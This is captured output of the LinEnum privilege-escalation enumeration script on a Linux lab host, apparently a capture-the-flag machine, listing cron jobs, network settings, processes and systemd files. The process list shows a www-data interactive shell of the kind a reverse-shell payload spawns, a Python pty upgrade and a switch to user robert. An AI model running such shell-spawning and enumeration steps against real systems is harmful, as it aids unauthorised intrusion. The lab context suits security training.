ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jan 23  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Jan 27  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2021-04-07 12:39:00 UTC  2min 35s left Wed 2021-04-07 12:09:21 UTC  27min ago    phpsessionclean.timer        phpsessionclean.service
Wed 2021-04-07 18:13:22 UTC  5h 36min left Wed 2021-04-07 06:14:55 UTC  6h ago       apt-daily.timer              apt-daily.service
Wed 2021-04-07 22:29:15 UTC  9h left       Wed 2021-04-07 08:02:49 UTC  4h 33min ago motd-news.timer              motd-news.service
Thu 2021-04-08 05:57:16 UTC  17h left      Wed 2021-04-07 05:57:16 UTC  6h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2021-04-08 06:19:53 UTC  17h left      Wed 2021-04-07 06:24:39 UTC  6h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2021-04-12 00:00:00 UTC  4 days left   Wed 2021-04-07 05:42:10 UTC  6h ago       fstrim.timer                 fstrim.service

6 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.28  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:a13c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:a13c  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a1:3c  txqueuelen 1000  (Ethernet)
        RX packets 1119351  bytes 154414232 (154.4 MB)
        RX errors 0  dropped 261  overruns 0  frame 0
        TX packets 919382  bytes 236709130 (236.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 70641  bytes 5123176 (5.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 70641  bytes 5123176 (5.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
_gateway (10.10.10.2) at 00:50:56:b9:ba:c4 [ether] on ens160


[-] Nameserver(s):
nameserver 127.0.0.53


[-] Nameserver(s):
Global
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens160)
      Current Scopes: none
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[-] Default route:
default         _gateway        0.0.0.0         UG    0      0        0 ens160


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 225272  9132 ?        Ss   05:41   0:03 /sbin/init auto automatic-ubiquity noprompt
root         2  0.0  0.0      0     0 ?        S    05:41   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   05:41   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   05:41   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    05:41   0:01 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    05:41   0:10 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    05:41   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    05:41   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    05:41   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    05:41   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    05:41   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    05:41   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    05:41   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    05:41   0:01 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<   05:41   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    05:41   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        I<   05:41   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    05:41   0:00 [rcu_tasks_kthre]
root        22  0.0  0.0      0     0 ?        S    05:41   0:00 [kauditd]
root        24  0.0  0.0      0     0 ?        S    05:41   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    05:41   0:00 [oom_reaper]
root        26  0.0  0.0      0     0 ?        I<   05:41   0:00 [writeback]
root        27  0.0  0.0      0     0 ?        S    05:41   0:00 [kcompactd0]
root        28  0.0  0.0      0     0 ?        SN   05:41   0:00 [ksmd]
root        29  0.0  0.0      0     0 ?        SN   05:41   0:00 [khugepaged]
root        30  0.0  0.0      0     0 ?        I<   05:41   0:00 [crypto]
root        31  0.0  0.0      0     0 ?        I<   05:41   0:00 [kintegrityd]
root        32  0.0  0.0      0     0 ?        I<   05:41   0:00 [kblockd]
root        33  0.0  0.0      0     0 ?        I<   05:41   0:00 [ata_sff]
root        34  0.0  0.0      0     0 ?        I<   05:41   0:00 [md]
root        35  0.0  0.0      0     0 ?        I<   05:41   0:00 [edac-poller]
root        36  0.0  0.0      0     0 ?        I<   05:41   0:00 [devfreq_wq]
root        37  0.0  0.0      0     0 ?        I<   05:41   0:00 [watchdogd]
root        41  0.0  0.0      0     0 ?        S    05:41   0:00 [kswapd0]
root        42  0.0  0.0      0     0 ?        I<   05:41   0:00 [kworker/u5:0]
root        43  0.0  0.0      0     0 ?        S    05:41   0:00 [ecryptfs-kthrea]
root        85  0.0  0.0      0     0 ?        I<   05:41   0:00 [kthrotld]
root        86  0.0  0.0      0     0 ?        I<   05:41   0:00 [acpi_thermal_pm]
root        87  0.0  0.0      0     0 ?        S    05:41   0:00 [scsi_eh_0]
root        88  0.0  0.0      0     0 ?        I<   05:41   0:00 [scsi_tmf_0]
root        89  0.0  0.0      0     0 ?        S    05:41   0:00 [scsi_eh_1]
root        90  0.0  0.0      0     0 ?        I<   05:41   0:00 [scsi_tmf_1]
root        96  0.0  0.0      0     0 ?        I<   05:41   0:00 [ipv6_addrconf]
root       105  0.0  0.0      0     0 ?        I<   05:41   0:00 [kstrp]
root       122  0.0  0.0      0     0 ?        I<   05:41   0:00 [charger_manager]
root       174  0.0  0.0      0     0 ?        I<   05:41   0:00 [mpt_poll_0]
root       175  0.0  0.0      0     0 ?        I<   05:41   0:00 [mpt/0]
root       214  0.0  0.0      0     0 ?        I<   05:42   0:00 [kworker/1:1H]
root       215  0.0  0.0      0     0 ?        S    05:42   0:00 [scsi_eh_2]
root       216  0.0  0.0      0     0 ?        I<   05:42   0:00 [scsi_tmf_2]
root       217  0.0  0.0      0     0 ?        I<   05:42   0:00 [ttm_swap]
root       218  0.0  0.0      0     0 ?        S    05:42   0:00 [irq/16-vmwgfx]
root       221  0.0  0.0      0     0 ?        I<   05:42   0:00 [kworker/0:1H]
root       289  0.0  0.0      0     0 ?        I<   05:42   0:00 [raid5wq]
root       336  0.0  0.0      0     0 ?        S    05:42   0:00 [jbd2/sda2-8]
root       337  0.0  0.0      0     0 ?        I<   05:42   0:00 [ext4-rsv-conver]
root       404  0.0  0.8 127852 18204 ?        S<s  05:42   0:00 /lib/systemd/systemd-journald
root       411  0.0  0.0      0     0 ?        I    05:42   0:08 [kworker/1:2]
root       412  0.0  0.0  97708  1928 ?        Ss   05:42   0:00 /sbin/lvmetad -f
root       414  0.0  0.0      0     0 ?        I<   05:42   0:00 [iscsi_eh]
root       415  0.0  0.0      0     0 ?        I<   05:42   0:00 [ib-comp-wq]
root       416  0.0  0.0      0     0 ?        I<   05:42   0:00 [ib-comp-unb-wq]
root       417  0.0  0.0      0     0 ?        I<   05:42   0:00 [ib_mcast]
root       418  0.0  0.0      0     0 ?        I<   05:42   0:00 [ib_nl_sa_wq]
root       419  0.0  0.0      0     0 ?        I<   05:42   0:00 [rdma_cm]
root       427  0.0  0.3  47392  6296 ?        Ss   05:42   0:02 /lib/systemd/systemd-udevd
root       462  0.0  0.0      0     0 ?        S<   05:42   0:00 [loop0]
root       465  0.0  0.0      0     0 ?        S<   05:42   0:00 [loop1]
systemd+   467  0.0  0.1 141932  3308 ?        Ssl  05:42   0:02 /lib/systemd/systemd-timesyncd
root       543  0.0  0.4  89860 10144 ?        Ss   05:42   0:00 /usr/bin/VGAuthService
root       544  0.0  0.3 216924  7168 ?        Ssl  05:42   0:18 /usr/bin/vmtoolsd
systemd+   751  0.0  0.2  71852  5316 ?        Ss   05:42   0:00 /lib/systemd/systemd-networkd
systemd+   826  0.0  0.2  70636  5008 ?        Ss   05:42   0:01 /lib/systemd/systemd-resolved
root       944  0.0  0.1 752688  2372 ?        Ssl  05:42   0:10 /usr/bin/lxcfs /var/lib/lxcfs/
root       961  0.0  1.1 853608 22592 ?        Ssl  05:42   0:01 /usr/lib/snapd/snapd
root       991  0.0  0.1  30028  3232 ?        Ss   05:42   0:00 /usr/sbin/cron -f
daemon     993  0.0  0.1  28332  2476 ?        Ss   05:42   0:00 /usr/sbin/atd -f
message+   996  0.0  0.2  50160  4908 ?        Ss   05:42   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
syslog    1045  0.0  0.2 263040  4656 ?        Ssl  05:42   0:00 /usr/sbin/rsyslogd -n
root      1099  0.0  0.8 169104 17256 ?        Ssl  05:42   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1100  0.0  0.3 286244  6932 ?        Ssl  05:42   0:00 /usr/lib/accountsservice/accounts-daemon
root      1114  0.0  0.2  70656  6012 ?        Ss   05:42   0:00 /lib/systemd/systemd-logind
root      1136  0.0  0.1 110548  2068 ?        Ssl  05:42   0:00 /usr/sbin/irqbalance --foreground
root      1185  0.0  0.0  14888  2000 tty1     Ss+  05:42   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1190  0.0  0.9 185952 20288 ?        Ssl  05:42   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1223  0.0  0.3  72300  6396 ?        Ss   05:42   0:00 /usr/sbin/sshd -D
root      1227  0.0  0.3 288904  6604 ?        Ssl  05:42   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql     1272  0.0  9.3 1490012 190572 ?      Sl   05:42   0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1292  0.0  0.9 333792 18508 ?        Ss   05:42   0:01 /usr/sbin/apache2 -k start
root      5975  0.0  0.0   4552   892 ?        Ss   08:11   0:00 /usr/sbin/acpid
uuidd     5986  0.0  0.0  26848  1440 ?        Ss   08:12   0:00 /usr/sbin/uuidd --socket-activation
root      6405  0.0  0.0      0     0 ?        I    06:25   0:06 [kworker/0:3]
root     20912  0.0  0.0      0     0 ?        I    12:03   0:00 [kworker/0:1]
root     20931  0.0  0.0      0     0 ?        I    12:06   0:00 [kworker/u4:4]
root     21074  0.0  0.0      0     0 ?        I    12:14   0:00 [kworker/1:1]
www-data 21125  0.0  0.6 338836 13116 ?        S    12:23   0:00 /usr/sbin/apache2 -k start
www-data 21126  0.0  0.7 338416 14448 ?        S    12:23   0:00 /usr/sbin/apache2 -k start
www-data 21127  0.0  0.6 338964 13288 ?        S    12:23   0:00 /usr/sbin/apache2 -k start
www-data 21128  0.0  0.6 338972 14048 ?        S    12:23   0:00 /usr/sbin/apache2 -k start
www-data 21131  0.0  0.0   4628   812 ?        S    12:23   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data 21135  0.0  0.0   4628   812 ?        S    12:23   0:00 /bin/sh -i
www-data 21140  0.0  0.4  37424  9376 ?        S    12:25   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data 21141  0.0  0.1  18508  3312 pts/0    Ss   12:25   0:00 /bin/bash
root     21145  0.0  0.0      0     0 ?        I    12:26   0:00 [kworker/u4:1]
root     21146  0.0  0.1  60084  3440 pts/0    S    12:27   0:00 su robert
robert   21147  0.0  0.3  76648  7012 ?        Ss   12:27   0:00 /lib/systemd/systemd --user
robert   21148  0.0  0.1 259256  2520 ?        S    12:27   0:00 (sd-pam)
robert   21158  0.0  0.2  21224  5056 pts/0    S    12:27   0:00 bash
www-data 21168  0.0  0.6 338836 13136 ?        S    12:27   0:00 /usr/sbin/apache2 -k start
www-data 21170  0.0  0.6 338828 13076 ?        S    12:27   0:00 /usr/sbin/apache2 -k start
root     21236  0.0  0.0      0     0 ?        I    12:32   0:00 [kworker/u4:0]
www-data 21239  0.0  0.6 338440 12872 ?        S    12:33   0:00 /usr/sbin/apache2 -k start
www-data 21240  0.0  0.6 338836 13212 ?        S    12:33   0:00 /usr/sbin/apache2 -k start
www-data 21241  0.0  0.6 338828 13072 ?        S    12:33   0:00 /usr/sbin/apache2 -k start
www-data 21271  0.0  0.6 338836 12840 ?        S    12:34   0:00 /usr/sbin/apache2 -k start
www-data 21858  0.0  0.4 338196  9292 ?        S    12:36   0:00 /usr/sbin/apache2 -k start
robert   21859  0.0  0.1  12384  3952 pts/0    S+   12:36   0:00 bash LinEnum.sh
robert   21860  0.0  0.1  12516  3236 pts/0    S+   12:36   0:00 bash LinEnum.sh
robert   21861  0.0  0.0   6180   884 pts/0    S+   12:36   0:00 tee -a
robert   22047  0.0  0.1  12516  2852 pts/0    S+   12:36   0:00 bash LinEnum.sh
robert   22048  0.0  0.1  38376  3720 pts/0    R+   12:36   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1113504 Jun  6  2019 /bin/bash
lrwxrwxrwx 1 root root        4 Aug  5  2019 /bin/sh -> dash
-rwxr-xr-x 1 root root  1595792 Nov 15  2019 /lib/systemd/systemd
-rwxr-xr-x 1 root root   129096 Nov 15  2019 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   219272 Nov 15  2019 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  1629264 Nov 15  2019 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   378944 Nov 15  2019 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    38976 Nov 15  2019 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   584136 Nov 15  2019 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    56552 Aug 22  2019 /sbin/agetty
lrwxrwxrwx 1 root root       20 Nov 15  2019 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root    84104 Dec  5  2019 /sbin/lvmetad
-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Nov 23  2018 /usr/bin/lxcfs
lrwxrwxrwx 1 root root        9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root root   129248 Dec  9  2019 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root    55552 Dec  9  2019 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 18927720 Oct 30  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    52064 Apr 28  2017 /usr/sbin/acpid
-rwxr-xr-x 1 root root   671392 Sep 16  2019 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root    64184 Jan  9  2019 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root 24613992 Jan 21  2020 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd
-rwxr-xr-x 1 root root    34976 Aug 22  2019 /usr/sbin/uuidd


[-] /etc/init.d/ binary permissions:
total 200
drwxr-xr-x  2 root root 4096 Jan 27  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rwxr-xr-x  1 root root 2269 Apr 22  2017 acpid
-rwxr-xr-x  1 root root 8181 Jul 16  2019 apache2
-rwxr-xr-x  1 root root 2489 Jul 16  2019 apache-htcacheclean
-rwxr-xr-x  1 root root 4335 Mar 22  2018 apparmor
-rwxr-xr-x  1 root root 2802 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1071 Aug 21  2015 atd
-rwxr-xr-x  1 root root 1232 Apr 19  2018 console-setup.sh
-rwxr-xr-x  1 root root 3049 Nov 16  2017 cron
-rwxr-xr-x  1 root root  937 Mar 18  2018 cryptdisks
-rwxr-xr-x  1 root root  978 Mar 18  2018 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Nov 15  2017 dbus
-rwxr-xr-x  1 root root 4489 Jun 28  2018 ebtables
-rwxr-xr-x  1 root root  985 Mar 18  2019 grub-common
-rwxr-xr-x  1 root root 3809 Feb 14  2018 hwclock.sh
-rwxr-xr-x  1 root root 2444 Oct 25  2017 irqbalance
-rwxr-xr-x  1 root root 1503 Dec 12  2018 iscsid
-rwxr-xr-x  1 root root 1479 Feb 15  2018 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 Aug 15  2017 kmod
-rwxr-xr-x  1 root root  695 Dec  3  2017 lvm2
-rwxr-xr-x  1 root root  571 Dec  3  2017 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Dec  3  2017 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2378 Nov 23  2018 lxcfs
-rwxr-xr-x  1 root root 2240 Nov 23  2018 lxd
-rwxr-xr-x  1 root root 2653 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root 1249 Jan 30  2019 mdadm-waitidle
-rwxr-xr-x  1 root root 5607 Jan 12  2018 mysql
-rwxr-xr-x  1 root root 4597 Nov 25  2016 networking
-rwxr-xr-x  1 root root 2503 Dec 12  2018 open-iscsi
-rwxr-xr-x  1 root root 1846 Apr  5  2019 open-vm-tools
-rwxr-xr-x  1 root root 1366 Apr  4  2019 plymouth
-rwxr-xr-x  1 root root  752 Apr  4  2019 plymouth-log
-rwxr-xr-x  1 root root 1191 Jan 17  2018 procps
-rwxr-xr-x  1 root root 4355 Dec 13  2017 rsync
-rwxr-xr-x  1 root root 2864 Jan 14  2018 rsyslog
-rwxr-xr-x  1 root root 1222 May 21  2017 screen-cleanup
-rwxr-xr-x  1 root root 3837 Jan 25  2018 ssh
-rwxr-xr-x  1 root root 5974 Apr 20  2018 udev
-rwxr-xr-x  1 root root 2083 Aug 15  2017 ufw
-rwxr-xr-x  1 root root 1391 Apr 29  2019 unattended-upgrades
-rwxr-xr-x  1 root root 1306 Oct 15  2018 uuidd
-rwxr-xr-x  1 root root 2757 Jan 20  2017 x11-common


[-] /etc/init/ config file permissions:
total 12
drwxr-xr-x  2 root root 4096 Jan 27  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root 1757 Jan 12  2018 mysql.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 7.3M
drwxr-xr-x 23 root root  36K Jan 27  2020 system
drwxr-xr-x  2 root root 4.0K Jan 27  2020 system-generators
drwxr-xr-x  2 root root 4.0K Jan 27  2020 system-sleep
drwxr-xr-x  2 root root 4.0K Jan 27  2020 network
drwxr-xr-x  2 root root 4.0K Jan 27  2020 system-preset
-rw-r--r--  1 root root 2.3M Nov 15  2019 libsystemd-shared-237.so
-rw-r--r--  1 root root  699 Nov 15  2019 resolv.conf
-rwxr-xr-x  1 root root 1.3K Nov 15  2019 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Nov 15  2019 systemd
-rwxr-xr-x  1 root root 6.0K Nov 15  2019 systemd-ac-power
-rwxr-xr-x  1 root root  18K Nov 15  2019 systemd-backlight
-rwxr-xr-x  1 root root  11K Nov 15  2019 systemd-binfmt
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K Nov 15  2019 systemd-cryptsetup
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-dissect
-rwxr-xr-x  1 root root  18K Nov 15  2019 systemd-fsck
-rwxr-xr-x  1 root root  23K Nov 15  2019 systemd-fsckd
-rwxr-xr-x  1 root root  19K Nov 15  2019 systemd-growfs
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Nov 15  2019 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-initctl
-rwxr-xr-x  1 root root 127K Nov 15  2019 systemd-journald
-rwxr-xr-x  1 root root  35K Nov 15  2019 systemd-localed
-rwxr-xr-x  1 root root 215K Nov 15  2019 systemd-logind
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-makefs
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-modules-load
-rwxr-xr-x  1 root root 1.6M Nov 15  2019 systemd-networkd
-rwxr-xr-x  1 root root  19K Nov 15  2019 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Nov 15  2019 systemd-quotacheck
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-random-seed
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-remount-fs
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-reply-password
-rwxr-xr-x  1 root root 371K Nov 15  2019 systemd-resolved
-rwxr-xr-x  1 root root  19K Nov 15  2019 systemd-rfkill
-rwxr-xr-x  1 root root  43K Nov 15  2019 systemd-shutdown
-rwxr-xr-x  1 root root  19K Nov 15  2019 systemd-sleep
-rwxr-xr-x  1 root root  23K Nov 15  2019 systemd-socket-proxyd
-rwxr-xr-x  1 root root  11K Nov 15  2019 systemd-sulogin-shell
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-sysctl
-rwxr-xr-x  1 root root  27K Nov 15  2019 systemd-timedated
-rwxr-xr-x  1 root root  39K Nov 15  2019 systemd-timesyncd
-rwxr-xr-x  1 root root 571K Nov 15  2019 systemd-udevd
-rwxr-xr-x  1 root root  15K Nov 15  2019 systemd-update-utmp
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-user-sessions
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-veritysetup
-rwxr-xr-x  1 root root  10K Nov 15  2019 systemd-volatile-root
-rwxr-xr-x  1 root root 1.3K Nov 15  2019 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Aug  5  2019 system-shutdown

/lib/systemd/system:
total 1.1M
drwxr-xr-x 2 root root 4.0K Jan 27  2020 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 getty.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 timers.target.wants
drwxr-xr-x 2 root root 4.0K Jan 27  2020 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Jan 27  2020 user@.service.d
drwxr-xr-x 2 root root 4.0K Jan 23  2020 apache2.service.d
-rw-r--r-- 1 root root  466 Dec  9  2019 open-vm-tools.service
-rw-r--r-- 1 root root  408 Dec  9  2019 vgauth.service
-rw-r--r-- 1 root root  383 Dec  5  2019 blk-availability.service
-rw-r--r-- 1 root root  341 Dec  5  2019 dm-event.service
-rw-r--r-- 1 root root  248 Dec  5  2019 dm-event.socket
-rw-r--r-- 1 root root  345 Dec  5  2019 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Dec  5  2019 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  300 Dec  5  2019 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Dec  5  2019 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  693 Dec  5  2019 lvm2-monitor.service
-rw-r--r-- 1 root root  403 Dec  5  2019 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Dec  5  2019 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  418 Dec  3  2019 cloud-config.service
-rw-r--r-- 1 root root  482 Dec  3  2019 cloud-final.service
-rw-r--r-- 1 root root  580 Dec  3  2019 cloud-init-local.service
-rw-r--r-- 1 root root  642 Dec  3  2019 cloud-init.service
-rw-r--r-- 1 root root  536 Dec  3  2019 cloud-config.target
-rw-r--r-- 1 root root  256 Dec  3  2019 cloud-init.target
-rw-r--r-- 1 root root  372 Nov 25  2019 unattended-upgrades.service
lrwxrwxrwx 1 root root   14 Nov 15  2019 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Nov 15  2019 checkroot.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Nov 15  2019 console-getty.service
-rw-r--r-- 1 root root 1.3K Nov 15  2019 container-getty@.service
lrwxrwxrwx 1 root root    9 Nov 15  2019 cryptdisks-early.service -> /dev/null
